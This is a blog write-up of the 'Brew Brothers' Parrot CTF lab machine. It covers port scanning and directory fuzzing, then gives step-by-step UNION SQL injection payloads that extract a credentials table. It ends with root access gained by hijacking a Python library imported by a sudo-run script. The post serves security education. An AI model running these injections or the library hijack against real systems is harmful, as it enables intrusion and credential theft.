<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="FmF" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="FmF" /> <title> Brew Brothers (Parrot CTF) - FmF </title> <link rel="alternate" href="http://localhost:4000/ParrotCtf-Brew_Brothers/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/ParrotCtf-Brew_Brothers/" /> <meta name="description" content="This is a personal blog about a hacking and other stuff." /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="Brew Brothers (Parrot CTF) | FmF" /> <meta property="og:title" content="Brew Brothers (Parrot CTF) | FmF" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/ParrotCtf-Brew_Brothers/" /> <meta property="og:description" content="This is a personal blog about a hacking and other stuff." /> <meta property="og:image" content="http://localhost:4000/ParrotCtf-Brew_Brothers/BrewBrothers_short.jpg" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="Brew Brothers (Parrot CTF) | " /> <meta name="twitter:url" content="http://localhost:4000/ParrotCtf-Brew_Brothers/" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:description" content="This is a personal blog about a hacking and other stuff." /> <meta name="twitter:image" content="http://localhost:4000/ParrotCtf-Brew_Brothers/BrewBrothers_short.jpg" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="FmF" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> <!-- for mathjax support --> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">Home</a><a class="menu-link" href="/archive/">Archive</a><a class="menu-link" href="/about/">About</a></a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#unix-linux">UNIX/LINUX</a>, <a class="tag" href="/tags/#parrot-ctf">PARROT CTF</a> </span> </div> <h1 class="header-title" itemprop="headline">Brew Brothers (Parrot CTF)</h1> <div class="post-meta"> <time datetime="2023-06-03T05:00:00+00:00" itemprop="datePublished"> Jun 03, 2023 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">FmF</span> </span> <time hidden datetime="" itemprop="dateModified"> Jun 03, 2023 </time> <span hidden itemprop="publisher" itemtype="Person">FmF</span> <span hidden itemprop="image">/ParrotCtf-Brew_Brothers/BrewBrothers_short.jpg</span> <span hidden itemprop="mainEntityOfPage"><p><img src="/ParrotCtf-Brew_Brothers/BrewBrothers.jpg" alt="We have been pwned..." /></p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p><img src="/ParrotCtf-Brew_Brothers/BrewBrothers.jpg" alt="We have been pwned..." /></p> <p>ü¶ú <a href="https://parrot-ctfs.com/">Parrot CTFs</a> is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.</p> <p>This is an easy difficulty machine that exploits a SQL injection vulnerability and library hijacking in a Python script to gain root privileges.</p> <h2 id="content"> <a href="#content" class="anchor-head"></a> Content: </h2> <ul> <li><a href="#enumeration-">Enumeration</a></li> <li><a href="#sqli-">SQLI</a></li> <li><a href="#privilege-escalation-">Privilege escalation</a></li> </ul> <h2 id="enumeration-"> <a href="#enumeration-" class="anchor-head"></a> Enumeration üîé: </h2> <p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the <em>TTL</em> of the machine to determine the OS we are dealing with.</p> <p><img src="/ParrotCtf-Brew_Brothers/ping.png" /></p> <p>Based on the <em>TTL</em> value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p> <p>Now, let‚Äôs go with an <code class="language-plaintext highlighter-rouge">nmap</code> scan to view the open ports.</p> <p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.32 -oN allPorts</code></p> <p><code class="language-plaintext highlighter-rouge">-p-</code> ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports.</p> <p><code class="language-plaintext highlighter-rouge">--open</code> ‚Äì&gt; It will only report open ports.</p> <p><code class="language-plaintext highlighter-rouge">-sS</code> ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second.</p> <p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000.</p> <p><code class="language-plaintext highlighter-rouge">-n</code> ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p> <p><code class="language-plaintext highlighter-rouge">-v</code> ‚Äì&gt; It will be verbose in its output.</p> <p><code class="language-plaintext highlighter-rouge">-Pn</code> ‚Äì&gt; This option skips the host discovery stage.</p> <p><code class="language-plaintext highlighter-rouge">-oN</code> ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù.</p> <p>We find out the following open ports:</p> <p><img src="/ParrotCtf-Brew_Brothers/ports.png" /></p> <p>Let‚Äôs take a look at what the page has.</p> <p><img src="/ParrotCtf-Brew_Brothers/page1.png" /></p> <p>Well‚Ä¶ nothing, it is a default page of apache2, so let‚Äôs start fuzzing.</p> <p>You can use whatever fuzzing tool you want, in my case I am going to use <code class="language-plaintext highlighter-rouge">wfuzz</code>.</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">c</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="nf">txt</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.14</span><span class="o">.</span><span class="mf">0.32</span><span class="o">/</span><span class="no">FUZZ</span>
</code></pre></div></div> <p>We are doing a simple fuzzing to find directories and we find <code class="language-plaintext highlighter-rouge">website</code> that seems interesting.</p> <p><img src="/ParrotCtf-Brew_Brothers/page2.png" /></p> <p>There is an <code class="language-plaintext highlighter-rouge">about.html</code> page, but it is not interesting.</p> <p>So let‚Äôs start fuzzing again but this time let‚Äôs search for <code class="language-plaintext highlighter-rouge">.html</code> pages.</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">c</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="nf">txt</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.14</span><span class="o">.</span><span class="mf">0.32</span><span class="o">/</span><span class="n">website</span><span class="o">/</span><span class="no">FUZZ</span><span class="p">.</span><span class="nf">html</span>
</code></pre></div></div> <p>We found these: <code class="language-plaintext highlighter-rouge">contact.html</code> and <code class="language-plaintext highlighter-rouge">search.html</code>.</p> <p>The <code class="language-plaintext highlighter-rouge">contact.html</code> page doesn‚Äôt appear to have any functional or reflected elements where we can inject something.</p> <p>However the <code class="language-plaintext highlighter-rouge">search.html</code> page is interesting because is trying to get data from something so we can try to test for SQLI.</p> <h2 id="sqli-"> <a href="#sqli-" class="anchor-head"></a> SQLI üíâ: </h2> <p>So how can we know if this is vulnerable to a SQL injection?, let‚Äôs do a simple injection like <code class="language-plaintext highlighter-rouge">' OR 1=1-- -</code> if this give us all the data that the actual db has, we can keep doing futher injections to try to get creds if there exists.</p> <p><img src="/ParrotCtf-Brew_Brothers/sqli1.png" /></p> <p>Yeah! there is a result of all the entries that are in the actual db.</p> <p>Let‚Äôs start doing more injections üíâ:</p> <p>This is to view which fields of output we have control over.</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="nb">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div></div> <p><img src="/ParrotCtf-Brew_Brothers/sqli2.png" /></p> <p>This is to view all the available databases. There, we can see an interesting database name, which is <code class="language-plaintext highlighter-rouge">creds</code>.</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="nb">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">schema_name</span><span class="p">)</span> <span class="n">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="nf">schemata</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div></div> <p><img src="/ParrotCtf-Brew_Brothers/sqli3.png" /></p> <p>With this, we can view the table names of the database, and there is only one table, which is named <code class="language-plaintext highlighter-rouge">credentials</code>.</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="nb">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span> <span class="n">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="nf">tables</span> <span class="n">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s2">"creds"</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div></div> <p><img src="/ParrotCtf-Brew_Brothers/sqli4.png" /></p> <p>With this, we can see the column names, which are <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code>.</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="nb">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">column_name</span><span class="p">)</span> <span class="n">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="nf">columns</span> <span class="n">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s2">"creds"</span> <span class="n">and</span> <span class="n">table_name</span><span class="o">=</span><span class="s2">"credentials"</span><span class="o">--</span> <span class="o">-</span> 
</code></pre></div></div> <p><img src="/ParrotCtf-Brew_Brothers/sqli5.png" /></p> <p>So know that we have enumerating the db let‚Äôs retrive all the usernames and passwords.</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="nb">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s2">":"</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="n">from</span> <span class="n">creds</span><span class="p">.</span><span class="nf">credentials</span><span class="o">--</span> <span class="o">-</span>
</code></pre></div></div> <p><img src="/ParrotCtf-Brew_Brothers/sqli6.png" /></p> <p>With this we can retrive only one credential that is: <code class="language-plaintext highlighter-rouge">charles:pyvzngr</code></p> <p>You can learn to do this injections <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">here</a>, and remember there is a lot of material out there for you to learn more about SQLI.</p> <p>So now that we have the credentials, we can try to log in through SSH, and once successful, we will have access to the machine as the user ‚Äú<strong>charles</strong>‚Äù.</p> <h2 id="privilege-escalation-"> <a href="#privilege-escalation-" class="anchor-head"></a> Privilege escalation üö©: </h2> <p>Now that we are inside the machine you need to do some things to ensure smooth operation:</p> <ol> <li><code class="language-plaintext highlighter-rouge">bash</code></li> <li><code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li> </ol> <p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p> <p>We need to enumerate the system to find a way to escalate privileges.</p> <p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.</p> <p>More info about privilege escalation check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here.</a></p> <p><img src="/ParrotCtf-Brew_Brothers/priv1.png" /></p> <p>We can see that we can execute a python3 script like root user but we can‚Äôt edit it :(</p> <p><img src="/ParrotCtf-Brew_Brothers/priv2.png" /></p> <p>The script basically hashes a random value and writes it to a file. It doesn‚Äôt seem to be useful, but we can see that it imports various libraries.</p> <p>The issue here is that we have write permissions in the directory where the Python3 script is located. Thanks to the priority python library path, we can add a malicious Python3 script to gain a shell with root user privileges. To accomplish this, we need to create a Python3 file and include the name of the module that is being imported, like this:</p> <p><img src="/ParrotCtf-Brew_Brothers/priv3.png" /></p> <p>Now, the only thing we need to do to become root is to execute the script with sudo privileges.</p> <p><img src="/ParrotCtf-Brew_Brothers/priv4.png" /></p> <p>Hope you like it and learn something new :)</p> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/Bsides-Panama-2023/" > <div class="nav-arrow">Previous</div> <span class="post-title">Bsides Panama CTF 2023</span> </a> <a class="post-nav-item post-nav-next" href="/ParrotCtf-Blogger/"> <div class="nav-arrow">Next</div> <span class="post-title">Blogger (Parrot CTF)</span> </a> </nav> <footer class="footer"> <span class="footer_item">&copy; 2023</span> <small class="footer_copyright"> Made with üíñ by FmF. </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
